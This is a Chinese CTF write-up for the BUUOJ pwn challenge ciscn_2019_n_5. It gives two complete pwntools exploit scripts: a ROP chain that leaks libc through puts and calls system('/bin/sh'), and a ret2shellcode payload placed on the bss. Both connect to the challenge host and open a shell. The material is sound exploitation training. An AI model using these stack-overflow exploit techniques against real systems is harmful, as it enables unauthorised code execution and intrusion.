---
title: ROP ciscn_2019_n_5
tags: [ctf-pwn,exp]
date: 2022-11-16 19:07:00
categories: [ctf-pwn]
excerpt: exp
---

**题目**

<https://buuoj.cn/challenges#ciscn_2019_n_5>

![](/img/ciscn_2019_n_5/1.jpg)

依旧是栈溢出，可以构造rop，也可以直接ret2shellcode（没开NX）

由于rop写习惯了，先列出rop的做法

![](/img/ciscn_2019_n_5/2.jpg)

第一个输入随便写，第二个输入开始溢出

![](/img/ciscn_2019_n_5/3.jpg)

溢出30+2+8 = 40个字节，用puts的got表来泄露libc基址

值得注意的是返回main后第二遍溢出时需要栈对齐

**Exp1**

```python
from pwn import *
from LibcSearcher import *

#p = process("./ciscn_2019_n_5")
p = remote('node4.buuoj.cn',27829)

e = ELF("./ciscn_2019_n_5")

main = e.symbols["main"]
puts_got = e.got["puts"]
puts_plt = e.plt["puts"]

pop_rdi = 0x400713
ret = 0x4004c9

p.recvline()
p.sendline(b'aaaa')
p.recvline()

payload = b'a' * 40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

p.sendlineafter(b"What do you want to say to me?\n", payload)

puts_addr =  u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

print(hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
offset = puts_addr - libc.dump('puts')
system = offset + libc.dump('system')
binsh = offset + libc.dump('str_bin_sh')

p.recvline()
p.sendline(b'aaaa')
p.recvline()

payload = b'a' * 40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendlineafter(b"What do you want to say to me?\n", payload)
p.interactive()
```



**ret2shellcode**

![](/img/ciscn_2019_n_5/4.jpg)

由于题目给了bss段上100个字节的空间，可以用来写shellcode

需要在注意的包括context.arch设置平台环境

而且特意看了一下 `len(shellcode) `是 48 < 100字节

```python
from pwn import *
from LibcSearcher import *

#p = process("./ciscn_2019_n_5")
p = remote('node4.buuoj.cn',27829)

context.arch = 'amd64'
context.log_level = 'debug'
shellcode = asm(shellcraft.sh())
name_addr = 0x0601080
p.sendlineafter("tell me your name\n",shellcode)
payload = b'a' * (0x20 + 0x8) + p64(name_addr)
p.sendlineafter(b"What do you want to say to me?\n",payload)
p.interactive()
```

